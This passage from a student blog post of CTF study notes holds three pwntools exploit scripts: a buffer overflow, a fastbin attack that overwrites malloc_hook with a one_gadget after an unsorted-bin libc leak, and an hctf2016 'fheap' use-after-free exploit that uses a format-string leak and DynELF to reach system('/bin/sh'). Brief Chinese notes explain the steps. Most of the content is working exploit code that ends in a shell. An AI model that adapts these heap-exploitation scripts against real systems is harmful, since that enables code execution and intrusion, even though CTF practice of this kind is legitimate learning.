<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-attribute">debug</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">a</span> = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">a</span> = remote(&#x27;node<span class="hljs-number">3</span>.buuoj.cn&#x27;,<span class="hljs-number">29354</span>)<br><span class="hljs-attribute">pay</span> = &#x27;a&#x27;*<span class="hljs-number">0</span>x<span class="hljs-number">38</span> + p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">80489</span>A<span class="hljs-number">0</span>) + p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">308</span>CD<span class="hljs-number">64</span>F)*<span class="hljs-number">2</span> + p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">195719</span>D<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-attribute">a</span>.sendline(pay)<br><span class="hljs-attribute">a</span>.interactive()<br></code></pre></td></tr></table></figure>
<p>远程环境有毛病只能shellcode了</p>
<h2 id="cgctf-note"><a href="#cgctf-note" class="headerlink" title="cgctf note"></a>cgctf note</h2><p>有些地方还是没有完全搞懂<br>大致攻击流程复现了下</p>
<h3 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h3><p>首先分配大小超过0x80的堆块free后show来leak//因为程序没有检查show时分配的堆块还是否存在<br>调试发现leak地址位于main_arena+88处<br><img src="39.png" srcset="/img/loading.gif" lazyload alt="39"><br>libc_base就是leak地址-(main_arena+88)</p>
<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>通过修改fd指针指向malloc_hook<br>再edit到onegadget处调用一次malloc即可</p>
<p>脚本如下</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./note3&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&quot;45.76.173.177&quot;</span>,<span class="hljs-number">6666</span>)<br><br>def <span class="hljs-built_in">add</span>(x,y):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(y))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Content:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(x)<br>def show(x):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(x)<br>def edit(x,y):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(y))<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(x)<br>def <span class="hljs-built_in">delete</span>(x):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(x)<br><br>one_gadget = <span class="hljs-number">0xd694f</span><br>area = <span class="hljs-number">0x397B00</span><br>malloc_hook = <span class="hljs-number">0x397AF0</span><br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-built_in">delete</span>(<span class="hljs-string">&#x27;0&#x27;</span>)<br>show(<span class="hljs-string">&#x27;0&#x27;</span>)<br>libc = temp = u64(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)) - area - <span class="hljs-number">88</span><br>one_gadget += libc<br>malloc_hook += libc<br>print <span class="hljs-string">&#x27;libc_base:&#x27;</span>+hex(libc)<br>print <span class="hljs-string">&#x27;one_gadget:&#x27;</span>+hex(one_gadget)<br>print <span class="hljs-string">&#x27;malloc_hook:&#x27;</span>+hex(malloc_hook)<br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span>,<span class="hljs-number">96</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-string">&#x27;2&#x27;</span>)<br>edit(p64(malloc_hook<span class="hljs-number">-0x23</span>),<span class="hljs-number">2</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-number">96</span>)<br>pay = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br><span class="hljs-built_in">add</span>(pay,<span class="hljs-number">96</span>)<br>gdb.attach(<span class="hljs-keyword">a</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;choice&gt;&gt;&quot;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="hctf2016–fheap"><a href="#hctf2016–fheap" class="headerlink" title="hctf2016–fheap"></a>hctf2016–fheap</h2><p>简单的UAF<br>分析出程序的结构体后发现free后未置0<br>利用uaf可以先分配三个小堆块然后分配0x20正好能覆盖到结构体中的指针<br>因为开启了pie通过覆盖低位为puts函数<br>下面就能调用delete函数leak出libc<br>然后整出system地址后重复一次攻击即可</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./fheap&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&quot;45.76.173.177&quot;</span>,<span class="hljs-number">6666</span>)<br><br>def <span class="hljs-built_in">create</span>(x,y):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;3.quit&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;create &quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Pls give string size:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(y))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;str:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(x)<br>def <span class="hljs-built_in">delete</span>(x):<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;3.quit&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;delete &quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;id:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(str(x))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Are you sure?:&quot;</span>)<br>    <span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&quot;yes&quot;</span>)<br>def leak(addr):<br>    <span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>    data=<span class="hljs-string">&#x27;aa%9$s&#x27;</span>+<span class="hljs-string">&#x27;#&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;aa%9$s&#x27;</span>))+p64(printf_plt)<br>    <span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;quit&quot;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(<span class="hljs-string">&quot;delete &quot;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;id:&#x27;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(str(<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;sure?:&#x27;</span>)<br>    <span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;yes01234&#x27;</span>+p64(addr))<br>    <span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>    data=<span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;####&#x27;</span>)[:<span class="hljs-number">-4</span>]<br>    data += <span class="hljs-string">&quot;\x00&quot;</span><br>    <span class="hljs-literal">return</span> data<br><br><span class="hljs-built_in">create</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)<br><span class="hljs-built_in">create</span>(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)<br><span class="hljs-built_in">create</span>(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>data = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;\x2D&#x27;</span><br><span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<span class="hljs-number">-0xd2d</span><br>printf_plt = libc_base + <span class="hljs-number">0x9D0</span><br><span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>data = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;\x2D&#x27;</span><br><span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>data = u64(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>d = DynELF(leak, libc_base, elf=ELF(<span class="hljs-string">&#x27;./fheap&#x27;</span>))<br>system_addr = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>print <span class="hljs-string">&#x27;**********leak**********&#x27;</span><br>print <span class="hljs-string">&#x27;leak_libc_base:&#x27;</span> + hex(libc_base)<br>print <span class="hljs-string">&#x27;leak_printf_plt:&#x27;</span> + hex(printf_plt)<br>print <span class="hljs-string">&quot;system_addr:&quot;</span> + hex(system_addr)<br>print <span class="hljs-string">&#x27;************************&#x27;</span><br>data = <span class="hljs-string">&quot;/bin/sh;&quot;</span><br>data += <span class="hljs-string">&#x27;1&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-built_in">len</span>(data))<br>data += p64(system_addr)<br><span class="hljs-built_in">create</span>(data,<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br>print <span class="hljs-string">&#x27;*********attack*********&#x27;</span><br><span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>大二上学习笔记</div>
      <div>http://www.psbazx.com/2019/09/05/大二上学习笔记/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Beitragsautor</div>
          <div>皮三宝</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Veröffentlicht am</div>
          <div>September 4, 2019</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>Urheberrechtshinweis</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/03/11/PE/" title="PE">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">PE</span>
                        <span class="visible-mobile">Vorheriger</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/" title="暑假学习随笔">
                        <span class="hidden-mobile">暑假学习随笔</span>
                        <span class="visible-mobile">Nächster</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Inhaltsverzeichnis</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
  </noscript>
</body>
</html>
